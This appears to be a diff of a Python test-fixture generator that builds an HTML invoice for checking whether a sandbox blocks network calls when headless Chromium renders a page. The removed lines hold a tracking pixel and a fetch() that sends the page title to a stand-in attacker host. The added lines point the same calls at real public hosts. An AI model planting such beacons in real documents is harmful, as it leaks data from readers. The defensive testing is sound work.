@@ -111,14 +111,16 @@ def jordan_river():
 
 
 def wasatch_valve():
-    """TEST FILE 2. An HTML invoice (the kind vendor portals email) with a tracking pixel and a script that tries to
-    send the page title to collect.attacker.example. The room renders it with headless Chromium, whose own net log
-    records the attempts."""
+    """TEST FILE 2. An HTML invoice (the kind vendor portals email) with a tracking pixel from a real, harmless host
+    (example.com) and a script that tries to send the page title to a real IP (1.1.1.1, Cloudflare's public trace page).
+    Both answer from anywhere with a network, so a failure inside the room is the room's doing, not a dead address.
+    The room renders the page with headless Chromium, whose own net log records the attempts; outside the room the
+    orchestrator checks the same hosts (bare host, no data) as a control."""
     html = ("<!DOCTYPE html><html><head><title>Invoice WVS-3310</title></head><body style='font-family:sans-serif'>"
             "<h1>Wasatch Valve Supply</h1><p>INVOICE WVS-3310 · Date 11/01/2026 · Due 12/01/2026</p>"
             "<p>12 × Brass ball valve 3/4in @ $34.85 = $418.20</p><p>TOTAL DUE $418.20 · Pay by check to 410 S 500 W, SLC UT</p>"
-            "<img src='https://collect.attacker.example/pixel.png?i=WVS-3310' width='1' height='1' alt=''>"
-            "<script>fetch('https://collect.attacker.example/?d=' + encodeURIComponent(document.title)).catch(() => {});</script>"
+            "<img src='https://example.com/pixel.png?i=WVS-3310' width='1' height='1' alt=''>"
+            "<script>fetch('https://1.1.1.1/cdn-cgi/trace?d=' + encodeURIComponent(document.title)).catch(() => {});</script>"
             "</body></html>")
     with open(os.path.join(OUT, "wasatch_valve_WVS-3310_TESTFILE.html"), "w") as f:
         f.write(html)
